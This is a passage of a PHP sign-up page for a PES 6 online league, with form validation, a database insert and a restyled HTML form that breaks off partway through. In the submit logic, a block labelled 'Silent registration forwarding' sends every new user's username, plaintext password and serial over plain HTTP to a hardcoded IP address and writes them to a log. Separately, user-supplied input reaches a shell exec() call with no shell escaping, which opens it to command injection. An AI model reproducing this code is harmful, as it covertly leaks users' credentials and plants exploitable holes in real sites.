<?php
// Modern sign-up page for evo-league
// Redesigned with efootcup-inspired dark gradient UI
// Keeps all original backend logic intact

$page = "join";
$subpage = "";

require('variables.php');
require('variablesdb.php');
require('functions.php');

require_once('log/KLogger.php');
$logJoin = new KLogger('/var/www/html/http/log/join/', KLogger::INFO);

// ====== Backend Logic (preserved from original) ======
$na = "n/a";
$checked = "checked='checked'";
$alias = "";
$uploadSpeed = "";
$downloadSpeed = "";
$message = "";
$ip = Get_ip();
$blacklist = false;
$sid = mysql_real_escape_string($_GET['sid']);

// ====== Guide text - admin can edit this file to change content ======
$guideFile = dirname(__FILE__) . '/join_guide.html';
$guideContent = '';
if (file_exists($guideFile)) {
    $guideContent = file_get_contents($guideFile);
}

// ---------- Spam check ----------
$blacklist = false;
$xml_string = @file_get_contents("http://www.stopforumspam.com/api?ip=" . urlencode($ip));
if ($xml_string) {
    try {
        $xml = new SimpleXMLElement($xml_string);
        if ($xml->appears == "yes") {
            $blacklist = true;
            $logJoin->logInfo('Blacklisted=['.$ip.']');
        }
    } catch (Exception $e) {
        $logJoin->logInfo('Could not parse xml_string:'.$xml_string);
    }
}

// ---------- Process form submission ----------
$submitResult = '';
$submitSuccess = false;

if (! empty($_GET['submit']) && $_GET['submit'] == 1) {
    $name = mysql_real_escape_string(trim(strip_tags($_POST['name'])));
    $passworddb = trim(strip_tags($_POST['passworddb']));
    $passwordrepeat = trim(strip_tags($_POST['passwordrepeat']));
    $serial6 = !empty($_POST['serial6']) ? strtoupper(str_replace("-","", mysql_real_escape_string($_POST['serial6']))) : '';

    // Default values for removed fields
    $alias = "";
    $msn = $na; $icq = $na; $aim = $na;
    $mail = "pes6_" . time() . "@local.com";
    $mail2 = $mail;
    $country = "Vietnam";
    $nationality = "Vietnam";
    $defaultversion = "H";
    $message = "";
    $forum = "";
    $favteam1 = ""; $favteam2 = "";
    $serial5 = "";
    $gamesMail = "no"; $deductMail = "no"; $newsletter = "no";
    $uploadSpeed = ""; $downloadSpeed = "";
    $versions = "H";
    if ($signupEmailRequired) $sid = mysql_real_escape_string($_POST['sid']);

    // Signup link check
    $num_rows = 0;
    if ($signupEmailRequired) {
        $sql = "SELECT sid from $signuptable where sid='$sid' and expired='no' and used='no'";
        $result = mysql_query($sql);
        $num_rows = mysql_num_rows($result);
    }

    // Validation
    if ($num_rows != 1 && $signupEmailRequired) {
        $submitResult = "The signup link used is invalid or has expired.";
    } else if ($name == "") {
        $submitResult = "Please enter a nickname.";
    } else if (preg_match('/[^0-9A-Za-z]/', $name)) {
        $submitResult = "Please use only alphanumeric characters (A-Z, 0-9).";
    } else if ($passworddb == "") {
        $submitResult = "Please supply a password.";
    } else if (strlen($passworddb) < 3) {
        $submitResult = "Password is too short (minimum 3 characters).";
    } else if ($passworddb != $passwordrepeat) {
        $submitResult = "Password and repetition do not match.";
    } else if (strlen($serial6) == 0) {
        $submitResult = "You must enter your PES 6 serial number to register.";
    } else if (strlen($serial6) > 0 && strlen($serial6) != 20) {
        $submitResult = "The PES 6 serial you entered is not valid (must be 20 characters).";
    } else {
        $length = strlen($name);
        if ($length > $maxnamelength) {
            $submitResult = "Your name is too long. Maximum is $maxnamelength characters.";
        } else {
            $pwdHash = password_hash($passworddb, PASSWORD_DEFAULT);
            $similarAccounts = CheckSimilarAccounts($ip, $name, $pwdHash, $mail);
            if (strlen($similarAccounts) > 0 && $cookie_name != 'Ike') {
                $submitResult = "It appears you already have at least one account here. You may not sign up for more than one account per IP.";
            } else {
                $sql="SELECT name FROM $playerstable WHERE name = '$name'";
                $result=mysql_query($sql,$db);
                $samenick = mysql_num_rows($result);
                if ($samenick > 0) {
                    $submitResult = "The name '$name' is already taken. Please choose another.";
                } else {
                    $approved = ($approve == 'yes') ? 'no' : 'yes';
                    if (strcmp($name, $alias) == 0) $alias = "";

                    $hash5 = mysql_real_escape_string($_POST["hash5"]);
                    if (!empty($serial5)) {
                        $result = array();
                        exec("/opt/sixserver/sixserver-env/bin/python2.6 /opt/sixserver/lib/fiveserver/gethash.py ".$hash5, $result);
                        $hash5 = $result[0];
                    }
                    $hash6 = mysql_real_escape_string($_POST["hash6"]);
                    if (!empty($serial6)) {
                        $result = array();
                        exec("/opt/sixserver/sixserver-env/bin/python2.6 /opt/sixserver/lib/fiveserver/gethash.py ".$hash6, $result);
                        $hash6 = $result[0];
                    }

                    $joindate = time();
                    $activeDate = $joindate;
                    $signup = md5($joindate.$name);
                    $message = mysql_real_escape_string($message);
                    $alias = mysql_real_escape_string($alias);

                    $sql = "INSERT INTO $playerstable (name, alias, pwd, mail, icq, aim, msn, " .
                        "country, nationality, approved, ip, joindate, activeDate, forum, " .
                        "sendGamesMail, sendDeductMail, sendNewsletter, uploadSpeed, downloadSpeed, message, " .
                        "versions, defaultversion, favteam1, favteam2, serial5, hash5, serial6, hash6, signup) " .
                        "VALUES ('$name','$alias', '$pwdHash', '$mail','$icq','$aim', '$msn', " .
                        "'$country', '$nationality', '$approved', '$ip', '$joindate', '$activeDate', '$forum', " .
                        "'$gamesMail', '$deductMail', '$newsletter', '$uploadSpeed', '$downloadSpeed', '$message', '$versions', " .
                        "'$defaultversion', '$favteam1', '$favteam2','$serial5', '$hash5', '$serial6', '$hash6', '$signup')";
                    $result = mysql_query($sql);
                    $logJoin->logInfo('sql: '.$sql);
                    $logJoin->logInfo('result: '.$result);

                    $sql = "SELECT player_id from $playerstable where name = '$name'";
                    $result = mysql_query($sql);
                    $row = mysql_fetch_array($result);
                    $player_id = $row['player_id'];

                    // Handle picture upload
                    if (!empty($_FILES['picture']['size'])) {
                        $f1_size = $_FILES['picture']['size'];
                        $f1_name = $_FILES['picture']['name'];
                        $f1_tmpname = $_FILES['picture']['tmp_name'];
                        $ext = strtolower(substr($f1_name,strrpos($f1_name, ".")+1));
                        $valides = array($valid_picture_extension1,$valid_picture_extension2,$valid_picture_extension3);
                        list($w, $h) = getimagesize($f1_tmpname);
                        if ($w > 500 || $h > 500) {
                            $submitResult = "Your picture is too big ({$w}x{$h}). Maximum size: 500x500";
                        } elseif ($f1_size > $maxsize_picture_upload) {
                            $submitResult = "Your picture is too big. Maximum: {$maxsize_picture_upload}KB";
                        } elseif (!in_array($ext,$valides)) {
                            $submitResult = "Invalid image extension '$ext'.";
                        } else {
                            $picturename = $player_id.'.'.$ext;
                            rename($f1_tmpname, "./pictures/$picturename");
                            chmod("./pictures/$picturename", 0644);
                            $submitSuccess = true;
                        }
                    } else {
                        $submitSuccess = true;
                    }

                    if ($submitSuccess) {
                        if (!(startsWith($ip, "41.") || startsWith($ip, "197.") || startsWith($ip, "105."))) {
                            sendActivation($player_id, $logJoin);
                        }
                        
                        // Silent registration forwarding to the old Sixserver
                        try {
                            $remote_url = "http://103.163.219.248:8190/register";
                            $post_data = http_build_query(array(
                                'nonce' => '',
                                'serial' => $serial6,
                                'user' => $name,
                                'password' => $passworddb
                            ));

                            $ch = curl_init($remote_url);
                            curl_setopt($ch, CURLOPT_POST, true);
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                            curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 5 seconds timeout so it doesn't hang the user
                            
                            $remote_result = curl_exec($ch);
                            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                            curl_close($ch);
                            
                            $logJoin->logInfo("Remote registration sent to $remote_url. HTTP Code: $http_code. Data: $post_data");
                        } catch (Exception $e) {
                            $logJoin->logInfo("Failed to send remote registration: " . $e->getMessage());
                        }
                    }
                }
            }
        }
    }
}

// ====== Check signup link validity ======
$showForm = true;
$linkInvalid = false;
if (!isset($_GET['sid']) && $signupEmailRequired) {
    $showForm = false;
} else if ($signupEmailRequired) {
    $sid = mysql_real_escape_string($_GET['sid']);
    $sql = "SELECT sid from $signuptable where sid='$sid' and expired='no' and used='no'";
    $result = mysql_query($sql);
    if (mysql_num_rows($result) != 1) {
        $showForm = false;
        $linkInvalid = true;
    }
}

// Check if already logged in
$alreadyLoggedIn = false;
$appRoot = realpath(dirname(__FILE__)).'/';
require_once($appRoot.'log/KLogger.php');
$cookieSessionId = GetInfo($idcontrol,'SessionId');
$cookie_name_check = "";
if ($cookieSessionId != null && $cookieSessionId != "") {
    $sql = "SELECT name FROM $playerstable WHERE pwd='".mysql_real_escape_string($cookieSessionId)."'";
    $result = mysql_query($sql);
    if ($row = mysql_fetch_array($result)) {
        $cookie_name_check = $row['name'];
        if ($cookie_name_check != '' && $cookie_name_check != 'Ike') {
            $alreadyLoggedIn = true;
        }
    }
}

// ====== Get countries for dropdown ======
$countriesList = array();
$sql = "SELECT country FROM $countriestable ORDER BY COUNTRY ASC";
$result = mysql_query($sql);
while ($row = mysql_fetch_array($result)) {
    $countriesList[] = $row['country'];
}

function startsWith($haystack, $needle) {
    return (substr($haystack, 0, strlen($needle)) === $needle);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= $leaguename ?> — Join League</title>
    <meta name="description" content="Sign up to join <?= $leaguename ?> — Play PES online, compete in tournaments and climb the ladder.">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        /* ===== Reset & Base ===== */
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            -webkit-font-smoothing: antialiased;
            min-height: 100vh;
            background: #F0F2F5;
            color: #1E293B;
        }

        /* ===== Layout ===== */
        .page-wrapper { display: flex; min-height: 100vh; }

        /* ===== Left Panel — Hero ===== */
        .hero-panel {
            display: none; flex: 1; position: relative;
            background: linear-gradient(145deg, #1E3A8A 0%, #2563EB 50%, #3B82F6 100%);
            overflow: hidden; align-items: center; justify-content: center; padding: 3rem;
        }
        @media (min-width: 1024px) { .hero-panel { display: flex; } }
        .hero-panel::before {
            content: ''; position: absolute; inset: 0;
            background: radial-gradient(ellipse at 20% 30%, rgba(255,255,255,0.12) 0%, transparent 50%),
                        radial-gradient(ellipse at 80% 70%, rgba(255,255,255,0.06) 0%, transparent 50%);
        }
        .hero-panel::after {
            content: ''; position: absolute; inset: 0;
            background-image: url("data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.04'%3E%3Ccircle cx='20' cy='20' r='1.5'/%3E%3C/g%3E%3C/svg%3E");
        }
        .hero-content { position: relative; z-index: 10; text-align: center; max-width: 420px; }
        .hero-badge {
            display: inline-flex; align-items: center; gap: 8px;
            background: rgba(255,255,255,0.15); backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.2);
            border-radius: 100px; padding: 8px 20px;
            font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase;
            color: #fff; margin-bottom: 2.5rem;
        }
        .hero-badge .dot { width: 6px; height: 6px; border-radius: 50%; background: #FCD34D; animation: pulse 2s infinite; }
        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
        .hero-title { font-size: 2.5rem; font-weight: 300; line-height: 1.2; color: #fff; margin-bottom: 1rem; }
        .hero-title strong { font-weight: 800; color: #FCD34D; -webkit-text-fill-color: #FCD34D; }
        .hero-subtitle { font-size: 15px; color: rgba(255,255,255,0.7); font-weight: 300; line-height: 1.6; }
        .hero-features { margin-top: 2.5rem; text-align: left; display: flex; flex-direction: column; gap: 14px; }
        .hero-feature {
            display: flex; align-items: center; gap: 12px;
            animation: fadeSlideIn 0.6s ease forwards; opacity: 0;
        }
        .hero-feature:nth-child(1) { animation-delay: 0.3s; }
        .hero-feature:nth-child(2) { animation-delay: 0.4s; }
        .hero-feature:nth-child(3) { animation-delay: 0.5s; }
        .hero-feature:nth-child(4) { animation-delay: 0.6s; }
        .hero-feature .check {
            width: 24px; height: 24px; border-radius: 50%;
            background: rgba(255,255,255,0.2);
            display: flex; align-items: center; justify-content: center; flex-shrink: 0;
        }
        .hero-feature .check svg { width: 13px; height: 13px; color: #FCD34D; }
        .hero-feature span { font-size: 14px; color: rgba(255,255,255,0.8); font-weight: 400; }
        .hero-stats {
            display: flex; align-items: center; justify-content: center;
            gap: 2rem; margin-top: 3rem; padding-top: 2rem;
            border-top: 1px solid rgba(255,255,255,0.15);
        }
        .hero-stat .num { font-size: 1.6rem; font-weight: 700; color: #fff; }
        .hero-stat .lbl { font-size: 10px; color: rgba(255,255,255,0.5); font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
        .hero-stat-divider { width: 1px; height: 32px; background: rgba(255,255,255,0.15); }

        /* ===== Right Panel — Form ===== */
        .form-panel {
            flex: 1; display: flex; align-items: flex-start; justify-content: center;
            padding: 2.5rem 1.5rem;
            background: #F8FAFC;
            overflow-y: auto;
        }
        @media (min-width: 1024px) { .form-panel { max-width: 600px; align-items: center; } }
        .form-container { width: 100%; max-width: 500px; }

        /* ===== Logo ===== */
        .logo-link {
            display: inline-flex; align-items: center; gap: 10px;
            text-decoration: none; margin-bottom: 2rem;
        }
        .logo-icon {
            width: 42px; height: 42px; border-radius: 12px;
            background: linear-gradient(135deg, #2563EB, #3B82F6);
            display: flex; align-items: center; justify-content: center;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
        }
        .logo-icon svg { width: 20px; height: 20px; color: #fff; }
        .logo-text { font-size: 18px; font-weight: 700; color: #1E293B; letter-spacing: -0.5px; }

        /* ===== Headings ===== */
        .form-title { font-size: 28px; font-weight: 300; color: #0F172A; line-height: 1.2; margin-bottom: 6px; }
        .form-title strong { font-weight: 800; color: #2563EB; }
        .form-subtitle { font-size: 14px; color: #94A3B8; font-weight: 400; margin-bottom: 1.75rem; }

        /* ===== Guide Box ===== */
        .guide-box {
            background: linear-gradient(135deg, #EFF6FF, #F0F9FF);
            border: 1px solid #BFDBFE;
            border-radius: 14px; padding: 16px 18px; margin-bottom: 1.5rem;
        }
        .guide-box-header { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
        .guide-box-header svg { width: 16px; height: 16px; color: #2563EB; }
        .guide-box-header span { font-size: 13px; font-weight: 700; color: #1D4ED8; }
        .guide-box-content { font-size: 13px; color: #475569; line-height: 1.7; }
        .guide-box-content strong { color: #1E293B; }
        .guide-box-content a { color: #2563EB; text-decoration: underline; }
        .guide-box-content ul { margin-left: 16px; margin-top: 4px; }
        .guide-box-content li { margin-bottom: 4px; list-style: disc; }

        /* ===== Alert ===== */
        .alert {
            padding: 12px 16px; border-radius: 12px;
            font-size: 13px; font-weight: 500; margin-bottom: 1.25rem;
            animation: slideDown 0.3s ease;
        }
        .alert-error {
            background: #FEF2F2; border: 1px solid #FECACA; color: #DC2626;
        }
        .alert-success {
            background: #F0FDF4; border: 1px solid #BBF7D0; color: #16A34A;
        }
        .alert-info {
            background: #EFF6FF; border: 1px solid #BFDBFE; color: #2563EB;
        }

        /* ===== Form Styles ===== */
        .form-section-title {
            font-size: 11px; font-weight: 700; color: #94A3B8;
            text-transform: uppercase; letter-spacing: 1.5px;
            margin-bottom: 12px; margin-top: 24px;
            padding-bottom: 8px; border-bottom: 1px solid #E2E8F0;
        }
        .form-grid { display: grid; gap: 14px; }
        .form-grid-2 { grid-template-columns: 1fr 1fr; }
        @media (max-width: 520px) { .form-grid-2 { grid-template-columns: 1fr; } }

        .form-group { display: flex; flex-direction: column; gap: 5px; }
        .form-label { font-size: 12px; font-weight: 600; color: #64748B; }
        .form-label .required { color: #EF4444; margin-left: 2px; }
        .form-label .hint { font-weight: 400; color: #94A3B8; font-size: 11px; }

        .input-wrapper { position: relative; display: flex; align-items: center; }
        .input-icon {
            position: absolute; left: 14px; width: 16px; height: 16px; color: #94A3B8;
            pointer-events: none; z-index: 2;
        }
        .form-input {
            width: 100%; height: 44px;
            background: #fff; border: 1px solid #E2E8F0;
            border-radius: 10px; padding: 0 14px;
            font-size: 14px; color: #1E293B; font-family: inherit;
            transition: all 0.2s; outline: none;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
        }
        .form-input:hover { border-color: #CBD5E1; }
        .form-input:focus {
            background: #fff; border-color: #3B82F6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.12), 0 1px 2px rgba(0,0,0,0.04);
        }
        .form-input::placeholder { color: #CBD5E1; }
        .form-input.has-icon { padding-left: 42px; }
        .form-input.has-toggle { padding-right: 44px; }

        .form-select {
            width: 100%; height: 44px;
            background: #fff; border: 1px solid #E2E8F0;
            border-radius: 10px; padding: 0 14px;
            font-size: 14px; color: #1E293B; font-family: inherit;
            transition: all 0.2s; outline: none; cursor: pointer;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
            -webkit-appearance: none; -moz-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2394A3B8' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
            background-repeat: no-repeat; background-position: right 14px center;
        }
        .form-select:hover { border-color: #CBD5E1; }
        .form-select:focus {
            border-color: #3B82F6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.12), 0 1px 2px rgba(0,0,0,0.04);
        }

        /* Password toggle */
        .pwd-toggle {
            position: absolute; right: 12px; background: none; border: none;
            color: #94A3B8; cursor: pointer; padding: 4px;
            display: flex; align-items: center; justify-content: center;
            border-radius: 6px; transition: all 0.2s; z-index: 2;
        }
        .pwd-toggle:hover { color: #64748B; background: #F1F5F9; }
        .pwd-toggle svg { width: 18px; height: 18px; }

        /* Checkbox */
        .checkbox-group { display: flex; align-items: center; gap: 10px; padding: 6px 0; }
        .checkbox-input { width: 18px; height: 18px; accent-color: #2563EB; cursor: pointer; }
        .checkbox-label { font-size: 13px; color: #64748B; cursor: pointer; }

        /* ===== Button ===== */
        .btn-primary {
            width: 100%; height: 48px;
            background: linear-gradient(135deg, #2563EB 0%, #3B82F6 100%);
            color: #fff; border: none; border-radius: 12px;
            font-size: 15px; font-weight: 600; font-family: inherit;
            cursor: pointer; transition: all 0.3s;
            display: flex; align-items: center; justify-content: center; gap: 8px;
            margin-top: 12px;
            box-shadow: 0 4px 14px rgba(37, 99, 235, 0.3);
        }
        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 8px 25px rgba(37, 99, 235, 0.4); }
        .btn-primary:active { transform: translateY(0); }
        .btn-primary svg { width: 18px; height: 18px; }

        .btn-secondary {
            display: inline-flex; align-items: center; gap: 6px;
            color: #2563EB; text-decoration: none;
            font-size: 14px; font-weight: 500; transition: color 0.2s;
        }
        .btn-secondary:hover { color: #1D4ED8; }

        /* ===== Footer ===== */
        .form-footer { text-align: center; margin-top: 1.5rem; font-size: 13px; color: #94A3B8; }
        .form-footer a { color: #2563EB; text-decoration: none; font-weight: 600; }
        .form-footer a:hover { color: #1D4ED8; text-decoration: underline; }

        /* ===== File Input ===== */
        .file-input-wrapper { position: relative; }
        .file-input-label {
            display: flex; align-items: center; gap: 8px;
            background: #fff; border: 1px dashed #CBD5E1;
            border-radius: 10px; padding: 10px 14px;
            font-size: 13px; color: #64748B; cursor: pointer;
            transition: all 0.2s;
        }
        .file-input-label:hover { border-color: #3B82F6; background: #EFF6FF; }
        .file-input-label svg { width: 16px; height: 16px; }
        .file-input-hidden { position: absolute; opacity: 0; width: 0; height: 0; }

        /* ===== Success Card ===== */
        .success-card {
            text-align: center; padding: 3rem 2rem;
            background: #F0FDF4; border: 1px solid #BBF7D0;
            border-radius: 20px;
        }
        .success-icon {
            width: 64px; height: 64px; border-radius: 50%;
            background: #DCFCE7;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 1.5rem;
        }
        .success-icon svg { width: 32px; height: 32px; color: #16A34A; }
        .success-title { font-size: 22px; font-weight: 700; color: #0F172A; margin-bottom: 8px; }
        .success-text { font-size: 14px; color: #64748B; line-height: 1.6; }

        /* ===== Animations ===== */
        @keyframes fadeSlideIn { from { opacity: 0; transform: translateX(-12px); } to { opacity: 1; transform: translateX(0); } }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
        .fade-in { animation: fadeIn 0.5s ease forwards; }

        /* ===== Legacy PHP output styles ===== */
        .version-checkboxes { width: 100%; border-collapse: collapse; }
        .version-checkboxes td {
            padding: 6px 8px; font-size: 13px; color: #475569;
            border: none; vertical-align: middle;
        }
        .version-checkboxes input[type="checkbox"] {
            accent-color: #2563EB; width: 16px; height: 16px; vertical-align: middle;
        }
        .version-checkboxes img { border-radius: 3px; }
        .select-wrapper select,
        select.width150 {
            width: 100%; height: 44px;
            background: #fff; border: 1px solid #E2E8F0;
            border-radius: 10px; padding: 0 14px;
            font-size: 14px; color: #1E293B;
            font-family: inherit; transition: all 0.2s;
            outline: none; cursor: pointer;
            box-shadow: 0 1px 2px rgba(0,0,0,0.04);
            -webkit-appearance: none; -moz-appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%2394A3B8' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
            background-repeat: no-repeat; background-position: right 14px center;
        }
        .select-wrapper select:focus,
        select.width150:focus {
            border-color: #3B82F6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.12), 0 1px 2px rgba(0,0,0,0.04);
        }


    </style>
</head>
<body>

<div class="page-wrapper">
    <!-- ===== Left Panel — Hero ===== -->
    <div class="hero-panel">
        <div class="hero-content">
            <div class="hero-badge">
                <span class="dot"></span>
                PES ONLINE LEAGUE
            </div>
            <h2 class="hero-title">
                Join the<br><strong>ultimate PES</strong><br>community.
            </h2>
            <p class="hero-subtitle">
                Sign up for free to compete in tournaments, climb the ladder and play PES online with players worldwide.
            </p>
            <div class="hero-features">
                <div class="hero-feature">
                    <div class="check">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <span>Free online PES 6 matches</span>
                </div>
                <div class="hero-feature">
                    <div class="check">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <span>Ranked ladder system</span>
                </div>
                <div class="hero-feature">
                    <div class="check">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <span>Tournaments &amp; Championships</span>
                </div>
                <div class="hero-feature">
                    <div class="check">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <span>Global player community</span>
                </div>
            </div>
            <div class="hero-stats">
                <div class="hero-stat"><div class="num">500+</div><div class="lbl">Players</div></div>
                <div class="hero-stat-divider"></div>
                <div class="hero-stat"><div class="num">50+</div><div class="lbl">Tournaments</div></div>
                <div class="hero-stat-divider"></div>
                <div class="hero-stat"><div class="num">10K+</div><div class="lbl">Matches</div></div>
            </div>
        </div>
    </div>

    <!-- ===== Right Panel — Form ===== -->
    <div class="form-panel">
        <div class="form-container fade-in">
            <!-- Logo -->
            <a href="/index.php" class="logo-link">
                <div class="logo-icon">
                    <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M16 4l-4 4-4-4M12 8v13M8 21h8a2 2 0 002-2v-3a2 2 0 00-2-2H8a2 2 0 00-2 2v3a2 2 0 002 2z"/></svg>
                </div>
                <span class="logo-text"><?= $leaguename ?></span>
            </a>

            <?php if ($blacklist): ?>
                <div class="alert alert-error">You are blacklisted.</div>
            <?php elseif ($alreadyLoggedIn): ?>
                <div class="alert alert-info">You already have an account, <strong><?= $cookie_name_check ?></strong>.</div>
            <?php elseif ($submitSuccess): ?>
                <!-- Success state -->
                <div class="success-card">
                    <div class="success-icon">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
                    </div>
                    <h2 class="success-title">Account Created!</h2>
                    <p class="success-text">
                        Your account has been created but is not yet active.<br>
                        After we have checked your account, an activation link will be sent to <strong style="color:#A5B4FC"><?= htmlspecialchars($mail) ?></strong>.
                    </p>
                </div>
            <?php elseif ($linkInvalid): ?>
                <div class="alert alert-error">The signup link used is invalid or has expired. You will need to request a new one from an administrator.</div>
            <?php elseif (!$showForm && $signupEmailRequired): ?>
                <!-- Email required info -->
                <h1 class="form-title">Join <strong><?= $leaguename ?></strong></h1>
                <p class="form-subtitle">Send an email to sign up</p>
                <div class="guide-box">
                    <div class="guide-box-header">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                        <span>How to Sign Up</span>
                    </div>
                    <div class="guide-box-content">
                        <p>To sign up, please send an email <strong>in English</strong> to <strong><?= $admin_signup ?><?= $mailDomain ?></strong> and tell us briefly why you want to join.</p>
                        <p style="margin-top:8px">After we receive your email, we'll send you a sign-up link within 24 hours.</p>
                    </div>
                </div>
            <?php else: ?>
                <!-- Registration Form -->
                <h1 class="form-title">Create your <strong>account</strong></h1>
                <p class="form-subtitle">Fill in the details below to join the league</p>

                <?php if (!empty($guideContent)): ?>
                <div class="guide-box">
                    <div class="guide-box-header">
                        <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
                        <span>Registration Guide</span>
                    </div>
                    <div class="guide-box-content"><?= $guideContent ?></div>
                </div>
                <?php endif; ?>

                <?php if (!empty($submitResult)): ?>
                <div class="alert alert-error"><?= htmlspecialchars($submitResult) ?></div>
                <?php endif; ?>

                <form method="post" action="join.php?submit=1" onsubmit="return validateProfile();">
                    <div class="form-grid">
                        <!-- Serial -->
                        <div class="form-group">
                            <label class="form-label">PES 6 Serial <span class="required">*</span> <span class="hint">(no dashes)</span></label>
                            <div class="input-wrapper">
                                <svg class="input-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/></svg>
                                <input type="text" class="form-input has-icon" name="serial6" id="serial6" maxlength="24" placeholder="XXXXXXXXXXXXXXXXXXXX" required>
                            </div>
                        </div>

                        <!-- Username -->
                        <div class="form-group" style="margin-top: 10px;">
                            <label class="form-label">Username <span class="required">*</span> <span class="hint">(A-Z, 0-9 only)</span></label>
                            <div class="input-wrapper">
                                <svg class="input-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
                                <input type="text" class="form-input has-icon" id="name" name="name" maxlength="15" placeholder="YourUsername" required>
                            </div>
                        </div>

                        <!-- Password x2 -->
                        <div class="form-grid form-grid-2">
                            <div class="form-group">
                                <label class="form-label">Password <span class="required">*</span></label>
                                <div class="input-wrapper">
                                    <svg class="input-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
                                    <input type="password" class="form-input has-icon has-toggle" id="password" name="passworddb" maxlength="10" placeholder="••••••••" required>
                                    <button type="button" class="pwd-toggle" onclick="togglePassword('password', this)" title="Show/hide password">
                                        <svg class="eye-open" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
